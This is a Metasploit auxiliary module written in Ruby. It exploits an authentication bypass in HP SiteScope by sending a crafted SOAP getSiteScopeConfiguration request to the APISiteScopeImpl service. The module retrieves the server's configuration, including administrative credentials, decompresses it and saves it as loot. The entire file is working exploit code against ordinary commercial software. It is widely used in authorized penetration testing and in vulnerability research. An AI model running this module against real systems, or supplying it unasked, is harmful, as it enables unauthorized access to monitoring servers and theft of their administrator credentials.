##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'HP SiteScope SOAP Call getSiteScopeConfiguration Configuration Access',
      'Description'  =>  %q{
          This module exploits an authentication bypass vulnerability in HP SiteScope
        which allows to retrieve the HP SiteScope configuration, including administrative
        credentials. It is accomplished by calling the getSiteScopeConfiguration operation
        available through the APISiteScopeImpl AXIS service. The HP SiteScope Configuration
        is retrieved as file containing Java serialization data. This module has been
        tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos
        6.3.
      },
      'References'   =>
        [
          [ 'OSVDB', '85120' ],
          [ 'BID', '55269' ],
          [ 'ZDI', '12-173' ]
        ],
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'      => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
    ])

    register_autofilter_ports([ 8080 ])
    deregister_options('RHOST')
  end

  def run_host(ip)
    @uri = normalize_uri(target_uri.path)
    @uri << '/' if @uri[-1,1] != '/'

    print_status("Connecting to SiteScope SOAP Interface")

    uri = normalize_uri(@uri, 'services/APISiteScopeImpl')

    res = send_request_cgi({
      'uri'     => uri,
      'method'  => 'GET'})

    if not res
      print_error("Unable to connect")
      return
    end

    access_configuration
  end

  def access_configuration

    data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
    data << "<wsns0:Envelope" + "\r\n"
    data << "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << "xmlns:xsd='http://www.w3.org/2001/XMLSchema'" + "\r\n"
    data << "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'" + "\r\n"
    data << ">" + "\r\n"
    data << "<wsns0:Body" + "\r\n"
    data << "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'" + "\r\n"
    data << ">" + "\r\n"
    data << "<impl:getSiteScopeConfiguration" + "\r\n"
    data << "xmlns:impl='http://Api.freshtech.COM'" + "\r\n"
    data << "></impl:getSiteScopeConfiguration>" + "\r\n"
    data << "</wsns0:Body>" + "\r\n"
    data << "</wsns0:Envelope>"

    print_status("Retrieving the SiteScope Configuration")

    uri = normalize_uri(@uri, 'services/APISiteScopeImpl')

    res = send_request_cgi({
      'uri'      => uri,
      'method'   => 'POST',
      'ctype'    => 'text/xml; charset=UTF-8',
      'data'     => data,
      'headers'  => {
        'SOAPAction'    => '""',
    }})

    if res and res.code == 200

      if res.headers['Content-Type'] =~ /boundary="(.*)"/
        boundary = $1
      end
      if not boundary or boundary.empty?
        print_error("Failed to retrieve the SiteScope Configuration")
        return
      end

      if res.body =~ /getSiteScopeConfigurationReturn href="cid:([A-F0-9]*)"/
        cid = $1
      end
      if not cid or cid.empty?
        print_error("Failed to retrieve the SiteScope Configuration")
        return
      end

      if res.body =~ /#{cid}>\r\n\r\n(.*)\r\n--#{boundary}/m
        loot = Rex::Text.ungzip($1)
      end
      if not loot or loot.empty?
        print_error("Failed to retrieve the SiteScope Configuration")
        return
      end

      path = store_loot('hp.sitescope.configuration', 'application/octet-stream', rhost, loot, cid, "#{rhost} HP SiteScope Configuration")
      print_good("HP SiteScope Configuration saved in #{path}")
      print_status("HP SiteScope Configuration is saved as Java serialization data")
      return
    end

    print_error("Failed to retrieve the SiteScope Configuration")
  end
end

